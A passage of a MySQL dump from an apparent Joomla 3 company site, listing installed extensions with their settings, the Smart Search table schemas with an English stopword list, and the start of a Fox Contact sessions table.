(600, 'English (United Kingdom)', 'language', 'en-GB', '', 0, 1, 1, 1, '{"name":"English (United Kingdom)","type":"language","creationDate":"2008-03-15","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.3","description":"en-GB site language","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(601, 'English (United Kingdom)', 'language', 'en-GB', '', 1, 1, 1, 1, '{"name":"English (United Kingdom)","type":"language","creationDate":"2008-03-15","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.3","description":"en-GB administrator language","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(700, 'files_joomla', 'file', 'joomla', '', 0, 1, 1, 1, '{"name":"files_joomla","type":"file","creationDate":"April 2013","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.1.1","description":"FILES_JOOMLA_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10001, 'flotech', 'template', 'flotech', '', 0, 1, 1, 0, '{"name":"flotech","type":"template","creationDate":"11th April 2013","author":"Pradeep Wickramanayake","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"pradeep@binarix.com","authorUrl":"http:\\/\\/www.binarix.com","version":"3.0.0","description":"TPL_BEEZ3_XML_DESCRIPTION","group":""}', '{"wrapperSmall":"53","wrapperLarge":"72","sitetitle":"","sitedescription":"","navposition":"center","templatecolor":"nature","backgroundcolor":"#eee"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10002, 'plg_editors_jce', 'plugin', 'jce', 'editors', 0, 1, 1, 0, '{"name":"plg_editors_jce","type":"plugin","creationDate":"28 July 2014","author":"Ryan Demmer","copyright":"2006-2010 Ryan Demmer","authorEmail":"info@joomlacontenteditor.net","authorUrl":"http:\\/\\/www.joomlacontenteditor.net","version":"2.4.2","description":"WF_EDITOR_PLUGIN_DESC","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10003, 'plg_quickicon_jcefilebrowser', 'plugin', 'jcefilebrowser', 'quickicon', 0, 1, 1, 0, '{"name":"plg_quickicon_jcefilebrowser","type":"plugin","creationDate":"28 July 2014","author":"Ryan Demmer","copyright":"Copyright (C) 2006 - 2014 Ryan Demmer. All rights reserved","authorEmail":"@@email@@","authorUrl":"www.joomalcontenteditor.net","version":"2.4.2","description":"PLG_QUICKICON_JCEFILEBROWSER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10004, 'jce', 'component', 'com_jce', '', 1, 1, 0, 0, '{"name":"JCE","type":"component","creationDate":"28 July 2014","author":"Ryan Demmer","copyright":"Copyright (C) 2006 - 2014 Ryan Demmer. All rights reserved","authorEmail":"info@joomlacontenteditor.net","authorUrl":"www.joomlacontenteditor.net","version":"2.4.2","description":"WF_ADMIN_DESC","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10006, 'flotech_followon', 'template', 'flotech_followon', '', 0, 1, 1, 0, '{"name":"flotech_followon","type":"template","creationDate":"11th April 2013","author":"Pradeep Wickramanayake","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"pradeep@binarix.com","authorUrl":"http:\\/\\/www.binarix.com","version":"3.0.0","description":"TPL_BEEZ3_XML_DESCRIPTION","group":""}', '{"wrapperSmall":"53","wrapperLarge":"72","sitetitle":"","sitedescription":"","navposition":"center","templatecolor":"nature","backgroundcolor":"#eee"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10007, 'Responsive Menu', 'module', 'mod_responsivemenu', '', 0, 1, 0, 0, '{"name":"Responsive Menu","type":"module","creationDate":"January 2013","author":"Cecil Gupta","copyright":"Copyright (C) Cecil Gupta. All rights reserved.","authorEmail":"cecilgupta@gmail.com","authorUrl":"www.AddonStreet.com","version":"1.2","description":"Responsive Menus for Joomla","group":""}', '{"startLevel":"1","endLevel":"0","subItemWidth":"150","showAllChildren":"1","MenuBG":"333333","MenuBG2":"3d3d3d","MenuBG3":"555555","MenuHoverBGClr":"999999","outlineClr":"666666","linksClr":"F4F4F4","linksHoverClr":"000000","jQuery":"1","cache":"1","cache_time":"900","cachemode":"itemid"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10008, 'MOD_SEXYCONTACTFORM_NAME', 'module', 'mod_sexycontactform', '', 0, 1, 0, 0, '{"name":"MOD_SEXYCONTACTFORM_NAME","type":"module","creationDate":"June 2012","author":"2GLux Company","copyright":"Copyright (\\u00a9) 2008-2013 2GLux company. All rights reserved.","authorEmail":"info@2glux.com","authorUrl":"http:\\/\\/2glux.com","version":"0.9.2","description":"MOD_SEXYCONTACTFORM_DESCRIPTION","group":""}', '{"form_id":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10009, 'sexycontactform', 'component', 'com_sexycontactform', '', 1, 1, 0, 0, '{"name":"Sexy Contact Form","type":"component","creationDate":"June 2012","author":"2GLux Company","copyright":"Copyright (\\u00a9) 2008-2013 2GLux company. All rights reserved.","authorEmail":"info@2glux.com","authorUrl":"http:\\/\\/2glux.com","version":"0.9.2","description":"COM_SEXYCONTACTFORM_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10010, 'Fox Contact', 'library', 'foxcontact', '', 0, 1, 1, 0, '{"name":"Fox Contact","type":"library","creationDate":"May 2013","author":"Demis Palma","copyright":"Demis Palma","authorEmail":"demis@fox.ra.it","authorUrl":"http:\\/\\/www.fox.ra.it\\/","version":"3.1.1","description":"","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10011, 'MOD_FOXCONTACT', 'module', 'mod_foxcontact', '', 0, 1, 0, 0, '{"name":"MOD_FOXCONTACT","type":"module","creationDate":"May 2013","author":"Demis Palma","copyright":"Demis Palma","authorEmail":"demis@fox.ra.it","authorUrl":"http:\\/\\/www.fox.ra.it\\/","version":"3.1.1","description":"MOD_FOXCONTACT_DESCRIPTION","group":""}', '{"form__width":"|auto","customhtml0display":"1","customhtml0order":"-1000","customhtml1display":"1","customhtml1order":"1000","labelsdisplay":"0","form_layout":"stacked","labels__width":"230|px","sender0display":"2","sender0order":"5","sender1display":"2","sender1order":"10","sender1isemail":"1","text0display":"1","text0order":"15","text1display":"0","text1order":"20","text2display":"0","text2order":"25","text3display":"0","text3order":"30","text4display":"0","text4order":"35","text5display":"0","text5order":"40","text6display":"0","text6order":"45","text7display":"0","text7order":"50","text8display":"0","text8order":"55","text9display":"0","text9order":"60","text__width":"85|%","dropdown0display":"1","dropdown0order":"65","dropdown1display":"0","dropdown1order":"70","dropdown2display":"0","dropdown2order":"75","dropdown__width":"85|%","textarea0display":"1","textarea0order":"80","textarea1display":"0","textarea1order":"85","textarea2display":"0","textarea2order":"90","textarea__width":"85|%","textarea__height":"180|px","checkbox0display":"1","checkbox0order":"95","checkbox1display":"0","checkbox1order":"100","checkbox2display":"0","checkbox2order":"105","checkbox3display":"0","checkbox3order":"110","checkbox4display":"0","checkbox4order":"115","uploaddisplay":"0","uploadmethod":"1","uploadmax_file_size":"102400","upload_filter":"1","upload_audio":"0","upload_video":"0","upload_images":"1","upload_documents":"1","upload_archives":"1","submittype":"0","submiticon":"","submitimage":"","resetbutton":"0","resettype":"0","reseticon":"","resetimage":"","email_sent_action":"0","email_sent_textdisplay":"1","copy_to_submitter":"1","email_copy_summary":"0","spam_check":"1","spam_detected_textdisplay":"1","stdcaptchadisplay":"0","stdcaptchatype":"0","stdcaptcha_length":"5","stdcaptchawidth":"150","stdcaptchaheight":"75","stdcaptchafont":"","stdcaptchafontmin":"14","stdcaptchafontmax":"20","stdcaptchaangle":"20","stdcaptcha_backgroundcolor":"#ffffff","stdcaptcha_textcolor":"#191919","stdcaptcha_disturbcolor":"#c8c8c8","css":"bootstrap.css","acymailing":"0","acymailing_checkboxes":"hidden|hidden","acymailing_auto_checked":"0","jnews":"0","jnews_checkboxes":"hidden|hidden","jnews_auto_checked":"0","othernewsletters":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10012, 'com_foxcontact', 'component', 'com_foxcontact', '', 1, 1, 0, 0, '{"name":"COM_FOXCONTACT","type":"component","creationDate":"May 2013","author":"Demis Palma","copyright":"Demis Palma","authorEmail":"demis@fox.ra.it","authorUrl":"http:\\/\\/www.fox.ra.it\\/","version":"3.1.1","description":"COM_FOXCONTACT_DESCRIPTION","group":""}', '{"adminemailfrom":{"select":"admin"},"adminemailreplyto":{"select":"submitter"},"submitteremailfrom":{"select":"admin"},"submitteremailreplyto":{"select":"admin"},"use_dns":"dns_check"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10014, 'Unite Revolution Slider', 'module', 'mod_unite_revolution', '', 0, 1, 0, 0, '{"name":"Unite Revolution Slider","type":"module","creationDate":"October 2012","author":"Unite CMS","copyright":"Copyright (C) 2012 UniteCMS.net, All rights reserved.","authorEmail":"support@unitecms.net","authorUrl":"http:\\/\\/unitecms.net","version":"2.2","description":"\\n\\t\\t\\t<div style=\\"font-weight:normal;\\">\\n\\t\\t\\t<p><strong>Unite Revolution Slider<\\/strong> module. Put the slider on any page. All the slider configuration located in Component.<\\/p>\\n\\t\\t\\t<p>\\n\\t\\t\\t\\tFor support please turn to <a href=\\"http:\\/\\/unitecms.net\\/joomla-extensions\\/unite-revolution-slider\\/unite-revolution-slider-support\\" target=\\"_blank\\">Unite Revolution Slider Support Page<\\/a>\\n\\t\\t\\t<\\/p>\\n\\t\\t\\t<small style=\\"float:right\\">ver. 2.2<\\/small>\\n\\t\\t\\t<\\/div>\\n     \\n\\t ","group":""}', '{"include_jquery":"true","js_load_type":"head","no_conflict_mode":"false","cache":"1","cache_time":"900","cachemode":"itemid"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10015, 'com_uniterevolution', 'component', 'com_uniterevolution', '', 1, 1, 0, 0, '{"name":"com_uniterevolution","type":"component","creationDate":"August 2012","author":"Unite CMS","copyright":"Copyright (C) 2012 UniteCMS.net, All rights reserved.","authorEmail":"support@unitecms.net","authorUrl":"http:\\/\\/www.unitecms.net","version":"2.2","description":"\\n\\t\\tRevolution Slider extension and module installation success!\\n\\t","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10016, 'System - Advanced Google Analytics', 'plugin', 'advga', 'system', 0, 1, 1, 0, '{"name":"System - Advanced Google Analytics","type":"plugin","creationDate":"Apr 2013","author":"www.deconf.com","copyright":"Copyright (C) 2010 www.deconf.com. All rights reserved.","authorEmail":"","authorUrl":"http:\\/\\/www.deconf.com\\/","version":"1.3","description":"ADVGA_DESC","group":""}', '{"advga_googleid":"UA-42128583-1","advga_domain":"flotechcontrols.com","advga_trackmode":"0","advga_categories":"0","advga_authors":"0","advga_pubyear":"0","advga_usertype":"0","advga_event":"0","advga_downloadf":"\\/\\\\.pdf$|\\\\.zip$|\\\\.rar$|\\\\.od*|\\\\.doc*|\\\\.xls*|\\\\.ppt*|\\\\.exe$|\\\\.dmg$|\\\\.mov$|\\\\.avi$|\\\\.mp3$\\/i","advga_anonim":"0","advga_trackadmin":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_filters`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_filters` (
  `filter_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '1',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL,
  `created_by_alias` varchar(255) NOT NULL,
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `map_count` int(10) unsigned NOT NULL DEFAULT '0',
  `data` text NOT NULL,
  `params` mediumtext,
  PRIMARY KEY (`filter_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links` (
  `link_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `route` varchar(255) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `indexdate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `md5sum` varchar(32) DEFAULT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '1',
  `state` int(5) DEFAULT '1',
  `access` int(5) DEFAULT '0',
  `language` varchar(8) NOT NULL,
  `publish_start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `list_price` double unsigned NOT NULL DEFAULT '0',
  `sale_price` double unsigned NOT NULL DEFAULT '0',
  `type_id` int(11) NOT NULL,
  `object` mediumblob NOT NULL,
  PRIMARY KEY (`link_id`),
  KEY `idx_type` (`type_id`),
  KEY `idx_title` (`title`),
  KEY `idx_md5` (`md5sum`),
  KEY `idx_url` (`url`(75)),
  KEY `idx_published_list` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`list_price`),
  KEY `idx_published_sale` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`sale_price`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms0`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms0` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms1`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms1` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms2`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms2` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms3`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms3` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms4`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms4` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms5`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms5` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms6`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms6` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms7`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms7` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms8`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms8` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_terms9`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_terms9` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termsa`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termsa` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termsb`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termsb` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termsc`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termsc` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termsd`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termsd` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termse`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termse` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_links_termsf`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_links_termsf` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_taxonomy`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_taxonomy` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL,
  `state` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `access` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  KEY `state` (`state`),
  KEY `ordering` (`ordering`),
  KEY `access` (`access`),
  KEY `idx_parent_published` (`parent_id`,`state`,`access`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `j6kpf_finder_taxonomy`
--

INSERT INTO `j6kpf_finder_taxonomy` (`id`, `parent_id`, `title`, `state`, `access`, `ordering`) VALUES
(1, 0, 'ROOT', 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_taxonomy_map`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_taxonomy_map` (
  `link_id` int(10) unsigned NOT NULL,
  `node_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`node_id`),
  KEY `link_id` (`link_id`),
  KEY `node_id` (`node_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_terms`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_terms` (
  `term_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '0',
  `soundex` varchar(75) NOT NULL,
  `links` int(10) NOT NULL DEFAULT '0',
  `language` char(3) NOT NULL DEFAULT '',
  PRIMARY KEY (`term_id`),
  UNIQUE KEY `idx_term` (`term`),
  KEY `idx_term_phrase` (`term`,`phrase`),
  KEY `idx_stem_phrase` (`stem`,`phrase`),
  KEY `idx_soundex_phrase` (`soundex`,`phrase`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_terms_common`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_terms_common` (
  `term` varchar(75) NOT NULL,
  `language` varchar(3) NOT NULL,
  KEY `idx_word_lang` (`term`,`language`),
  KEY `idx_lang` (`language`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_finder_terms_common`
--

INSERT INTO `j6kpf_finder_terms_common` (`term`, `language`) VALUES
('a', 'en'),
('about', 'en'),
('after', 'en'),
('ago', 'en'),
('all', 'en'),
('am', 'en'),
('an', 'en'),
('and', 'en'),
('ani', 'en'),
('any', 'en'),
('are', 'en'),
('aren''t', 'en'),
('as', 'en'),
('at', 'en'),
('be', 'en'),
('but', 'en'),
('by', 'en'),
('for', 'en'),
('from', 'en'),
('get', 'en'),
('go', 'en'),
('how', 'en'),
('if', 'en'),
('in', 'en'),
('into', 'en'),
('is', 'en'),
('isn''t', 'en'),
('it', 'en'),
('its', 'en'),
('me', 'en'),
('more', 'en'),
('most', 'en'),
('must', 'en'),
('my', 'en'),
('new', 'en'),
('no', 'en'),
('none', 'en'),
('not', 'en'),
('noth', 'en'),
('nothing', 'en'),
('of', 'en'),
('off', 'en'),
('often', 'en'),
('old', 'en'),
('on', 'en'),
('onc', 'en'),
('once', 'en'),
('onli', 'en'),
('only', 'en'),
('or', 'en'),
('other', 'en'),
('our', 'en'),
('ours', 'en'),
('out', 'en'),
('over', 'en'),
('page', 'en'),
('she', 'en'),
('should', 'en'),
('small', 'en'),
('so', 'en'),
('some', 'en'),
('than', 'en'),
('thank', 'en'),
('that', 'en'),
('the', 'en'),
('their', 'en'),
('theirs', 'en'),
('them', 'en'),
('then', 'en'),
('there', 'en'),
('these', 'en'),
('they', 'en'),
('this', 'en'),
('those', 'en'),
('thus', 'en'),
('time', 'en'),
('times', 'en'),
('to', 'en'),
('too', 'en'),
('true', 'en'),
('under', 'en'),
('until', 'en'),
('up', 'en'),
('upon', 'en'),
('use', 'en'),
('user', 'en'),
('users', 'en'),
('veri', 'en'),
('version', 'en'),
('very', 'en'),
('via', 'en'),
('want', 'en'),
('was', 'en'),
('way', 'en'),
('were', 'en'),
('what', 'en'),
('when', 'en'),
('where', 'en'),
('whi', 'en'),
('which', 'en'),
('who', 'en'),
('whom', 'en'),
('whose', 'en'),
('why', 'en'),
('wide', 'en'),
('will', 'en'),
('with', 'en'),
('within', 'en'),
('without', 'en'),
('would', 'en'),
('yes', 'en'),
('yet', 'en'),
('you', 'en'),
('your', 'en'),
('yours', 'en');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_tokens`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_tokens` (
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '1',
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `language` char(3) NOT NULL DEFAULT '',
  KEY `idx_word` (`term`),
  KEY `idx_context` (`context`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_tokens_aggregate`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_tokens_aggregate` (
  `term_id` int(10) unsigned NOT NULL,
  `map_suffix` char(1) NOT NULL,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `term_weight` float unsigned NOT NULL,
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `context_weight` float unsigned NOT NULL,
  `total_weight` float unsigned NOT NULL,
  `language` char(3) NOT NULL DEFAULT '',
  KEY `token` (`term`),
  KEY `keyword_id` (`term_id`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_finder_types`
--

CREATE TABLE IF NOT EXISTS `j6kpf_finder_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL,
  `mime` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `title` (`title`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_foxcontact_sessions`
--

CREATE TABLE IF NOT EXISTS `j6kpf_foxcontact_sessions` (
  `id` varchar(32) NOT NULL,
  `cid` int(11) NOT NULL,
  `mid` int(11) NOT NULL,
  `keyword` varchar(32) NOT NULL,
  `birth` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `data` text,
  UNIQUE KEY `index` (`id`,`cid`,`mid`,`keyword`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_foxcontact_sessions`
--

INSERT INTO `j6kpf_foxcontact_sessions` (`id`, `cid`, `mid`, `keyword`, `birth`, `data`) VALUES
